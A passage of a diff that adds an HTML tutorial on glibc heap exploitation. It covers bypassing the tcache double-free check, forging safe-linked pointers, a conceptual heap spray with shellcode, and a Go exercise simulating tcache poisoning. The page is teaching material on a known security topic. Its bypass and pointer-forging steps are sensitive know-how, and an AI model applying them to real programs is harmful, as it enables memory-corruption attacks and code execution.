+							is already in tcache (double-free detected):
+						</p>
+						<pre class="c">
+// Simplified glibc 2.29+ tcache_put
+if (chunk-&gt;key == tcache) {
+    // Double free detected — abort
+}
+chunk-&gt;key = tcache;
+chunk-&gt;next = tcache-&gt;entries[idx];
+tcache-&gt;entries[idx] = chunk;
+tcache-&gt;counts[idx]++;
+						</pre>
+						<p>
+							To bypass: if you can overwrite the
+							<code>key</code>
+							field (via a heap overflow of the preceding chunk),
+							you can clear it, allowing a double-free. Alternatively, free 7 chunks to fill the tcache (the
+							8th goes to fastbins/unsorted bin), then perform your attack.
+						</p>
+					</section>
+					<section>
+						<h3 id="safe-linking-protection">Safe-Linking Protection</h3>
+						<p>
+							Glibc 2.32 added safe-linking - the fd/next pointer in tcache and fastbin chunks is XORed with
+							the address of the chunk itself shifted right by 12 bits:
+						</p>
+						<pre class="c">
+#define PROTECT_PTR(pos, ptr)  ((size_t)(pos) &gt;&gt; 12) ^ ((size_t)(ptr))
+#define REVEAL_PTR(ptr)        PROTECT_PTR(ptr, ptr)
+
+// Storing:
+chunk-&gt;next = PROTECT_PTR(&amp;chunk-&gt;next, target_chunk);
+
+// Loading:
+next_chunk = REVEAL_PTR(chunk-&gt;next);
+						</pre>
+						<p>
+							To forge a safe-linked pointer, you need to know the address of the chunk whose
+							<code>next</code>
+							pointer
+							you're overwriting. If you have a heap leak, you can compute the correct XOR mask:
+						</p>
+						<pre class="python">
+def protect_ptr(pos, ptr):
+    return (pos &gt;&gt; 12) ^ ptr
+
+def reveal_ptr(mangled):
+    return (mangled &gt;&gt; 12) ^ mangled
+
+# To forge a pointer from chunk to target:
+chunk_addr = 0x5555555592a0  # Known through leak
+target = 0x7ffff7e00000       # Target address
+mangled = protect_ptr(chunk_addr + offset_of_next, target)
+						</pre>
+						<p>Safe-linking raises the bar: you need a heap address leak in addition to the overflow primitive.</p>
+					</section>
+					<section>
+						<h3 id="heap-exploitation-methodology">Heap Exploitation Methodology</h3>
+						<pre class="plaintext">
+1. Identify the bug (overflow, UAF, double-free) and constraints
+2. Determine heap layout (chunk sizes, adjacency, ordering)
+3. Choose attack strategy based on glibc version and available primitives
+4. Leak heap addresses (for safe-linking bypass, if needed)
+5. Leak libc addresses (for hook/one_gadget targeting)
+6. Corrupt metadata or pointers
+7. Trigger controlled allocation (malloc) or deallocation (free)
+8. Redirect execution (overwrite a hook, function pointer, or vtable entry)
+						</pre>
+					</section>
+					<section>
+						<h3 id="heap-allocation-and-mmap">Heap Allocation and mmap</h3>
+						<p>Not all heap memory comes from brk/sbrk. Large allocations (default > 128 KB) use mmap directly:</p>
+						<pre class="bash">
+$ cat /proc/meminfo | grep MmapThreshold
+						</pre>
+						<p>
+							Chunks allocated via mmap have the IS_MM
+							<abbr title="Access Point">AP</abbr>
+							PED (0x2) flag in size. They are
+							not subject to bin management -
+							<code>free()</code>
+							calls
+							<code>munmap()</code>
+							directly.
+						</p>
+						<pre class="c">
+// Demonstrating mmap-chunk boundary
+char *big = malloc(256 * 1024);  // 256 KB -&gt; mmap&#39;d
+char *small = malloc(128);       // brk&#39;d heap
+
+// big&#39;s chunk header:
+// size = 0x40002 (0x40000 | IS_MMAPPED)
+						</pre>
+					</section>
+					<section>
+						<h3 id="heap-spray">Heap Spray</h3>
+						<p>
+							Heap spray fills the heap with many copies of your payload, making the address space predictable.
+							Common in JavaScript/browser exploits where you can allocate lots of strings/arrays but can't
+							control exact placement:
+						</p>
+						<pre class="python">
+# Conceptual heap spray
+spray_size = 0x1000
+payload = nop_sled + shellcode
+allocation = payload + b&#34;\x00&#34; * (spray_size - len(payload))
+
+for i in range(1000):
+    malloc(spray_size, allocation)  # Fill the heap with copies
+						</pre>
+						<p>
+							After the spray, large regions of the address space contain the payload. Even if you don't know
+							the exact address, a jump to a sprayed region has a high probability of landing on the NOP sled.
+						</p>
+					</section>
+					<section>
+						<h3 id="heap-vs-stack-overflow">Heap vs Stack Overflow</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Property</th>
+									<th align="center">Stack Overflow</th>
+									<th align="center">Heap Overflow</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Target</td>
+									<td align="center">Return address -> RIP</td>
+									<td align="center">Metadata, function pointers, vtables</td>
+								</tr>
+								<tr>
+									<td align="center">Determinism</td>
+									<td align="center">High (stack layout is predictable)</td>
+									<td align="center">Medium (heap layout depends on allocation patterns)</td>
+								</tr>
+								<tr>
+									<td align="center">Mitigation discovery</td>
+									<td align="center">Compiler level (canaries)</td>
+									<td align="center">Allocator level (safe unlinking, tcache key, safe-linking)</td>
+								</tr>
+								<tr>
+									<td align="center">Exploit complexity</td>
+									<td align="center">Low to medium</td>
+									<td align="center">High (requires understanding of allocator internals)</td>
+								</tr>
+								<tr>
+									<td align="center">Tools</td>
+									<td align="center">GDB, pwntools, ROPgadget</td>
+									<td align="center">pwndbg heap commands, ltrace, valgrind</td>
+								</tr>
+								<tr>
+									<td align="center">glibc version sensitivity</td>
+									<td align="center">Low (call/ret hasn't changed)</td>
+									<td align="center">Very high (protections added every glibc release)</td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							Heap exploitation requires deep knowledge of the allocator's implementation - its data structures,
+							algorithms, and integrity checks. Every glibc version changes the playing field. The core principles
+							(corrupt metadata -> convert to primitives -> redirect execution) remain constant, but the specific
+							techniques evolve with each release.
+						</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Write a Go program that simulates a tcache bin and demonstrates the poisoning primitive from
+							Attack Vector 2. Model each entry as a node with an address and a
+							<code>next</code>
+							pointer. Implement
+							three operations:
+							<code>free(addr)</code>
+							pushes a chunk onto the LIFO head,
+							<code>malloc()</code>
+							pops the head,
+							and
+							<code>poison(addr, target)</code>
+							simulates an overflow that rewrites the freed chunk's
+							<code>next</code>
+							pointer.
+							After one chunk is freed and its
+							<code>next</code>
+							pointer is overwritten, the second
+							<code>malloc()</code>
+							must return
+							the attacker-controlled target address.
+						</p>
+						<pre class="go">
+package main
+
+import &#34;fmt&#34;
+
+type chunk struct {
+	addr uintptr
+	next *chunk
+}
+
+type tcache struct {
+	head  *chunk
+	count int
+}
+
+func (t *tcache) free(addr uintptr) {
+	// TODO: push a new chunk with addr onto the head, increment count
+}
+
+func (t *tcache) malloc() uintptr {
+	// TODO: pop the head, decrement count, return the popped address
+	return 0
+}
+
+func (t *tcache) poison(addr, target uintptr) {
+	// TODO: find the chunk at addr and set its next pointer to target
+}
+
+func main() {
+	t := &amp;tcache{}
+
+	t.free(0x5555555592a0)
+	t.poison(0x5555555592a0, 0x7ffff7faa580)
+
+	fmt.Printf(&#34;first  = %#x\n&#34;, t.malloc())
+	fmt.Printf(&#34;second = %#x\n&#34;, t.malloc())
+}
+						</pre>
+						<p>
+							The second
+							<code>malloc()</code>
+							must print
+							<code>0x7ffff7faa580</code>
+							. Then extend the simulator with the safe-linking
+							mask from this article, where the stored pointer is
+							<code>(addr &gt;&gt; 12) ^ target</code>
+							, and show how the
+							<code>poison</code>
+							step changes once the mask is applied.
+						</p>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c" target="_blank">glibc malloc source - malloc/malloc.c</a></li>
+							<li><a class="icon-website" href="https://sourceware.org/glibc/wiki/MallocInternals" target="_blank">MallocInternals - glibc wiki</a></li>
+							<li><a class="icon-website" href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/" target="_blank">Understanding glibc malloc - SploitFun</a></li>
+							<li><a class="icon-download" href="https://wiki-prog.infoprepa.epita.fr/images/0/04/Malloc_tutorial.pdf" target="_blank">A Malloc Tutorial - Marwan Burelle</a></li>
+							<li><a class="icon-github" href="https://github.com/shellphish/how2heap" target="_blank">how2heap - shellphish</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
